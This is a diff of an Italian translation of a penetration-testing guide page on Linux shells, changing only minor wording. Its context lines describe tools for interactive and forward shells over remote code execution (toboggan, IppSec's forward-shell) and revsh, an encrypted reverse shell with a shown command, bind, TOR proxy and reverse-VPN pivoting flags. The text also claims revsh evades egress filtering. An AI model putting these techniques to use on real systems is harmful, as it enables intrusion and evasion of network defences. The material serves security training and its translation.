@@ -79,7 +79,7 @@ E poi, puoi eseguire:
 ```shell
 toboggan -m nix.py -i
 ```
-Per sfruttare direttamente una shell interattiva. Puoi aggiungere `-b` per l'integrazione con Burpsuite e rimuovere il `-i` per un wrapper RCE più basilare.
+Per sfruttare direttamente una shell interattiva. Puoi aggiungere `-b` per l'integrazione con Burpsuite e rimuovere il `-i` per un wrapper rce più basilare.
 
 Un'altra possibilità consiste nell'utilizzare l'implementazione della shell forward di `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
@@ -89,7 +89,7 @@ Devi solo modificare:
 - Il prefisso e il suffisso del tuo payload (se presenti)
 - Il modo in cui il payload viene inviato (headers? dati? informazioni extra?)
 
-Poi, puoi semplicemente **inviare comandi** o persino **usare il comando `upgrade`** per ottenere un PTY completo (nota che i pipe vengono letti e scritti con un ritardo approssimativo di 1,3 secondi).
+Poi, puoi semplicemente **inviare comandi** o anche **usare il comando `upgrade`** per ottenere un PTY completo (nota che le pipe vengono lette e scritte con un ritardo approssimativo di 1,3 secondi).
 
 ## Netcat
 ```bash
@@ -241,7 +241,7 @@ Features:
 - `-s` per avviare qualsiasi binario (ad es. `/bin/sh`, `python3`) sulla vittima
 - `--up` per aggiornare automaticamente a un PTY completamente interattivo
 
-## revsh (crittografato e pronto per il pivoting)
+## revsh (pronto per la crittografia e il pivoting)
 
 `revsh` è un piccolo client/server C che fornisce un TTY completo su un **tunnel Diffie-Hellman crittografato** e può opzionalmente allegare un'interfaccia **TUN/TAP** per il pivoting simile a una VPN inversa.
 ```bash
@@ -256,7 +256,7 @@ revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
 ```
 Utili flag:
 - `-b` : bind-shell invece di reverse
-- `-p socks5://127.0.0.1:9050` : proxy tramite TOR/HTTP/SOCKS
+- `-p socks5://127.0.0.1:9050` : proxy attraverso TOR/HTTP/SOCKS
 - `-t` : crea un'interfaccia TUN (reverse VPN)
 
 Poiché l'intera sessione è crittografata e multiplexata, spesso bypassa il semplice filtraggio in uscita che ucciderebbe una shell in testo semplice `/dev/tcp`.
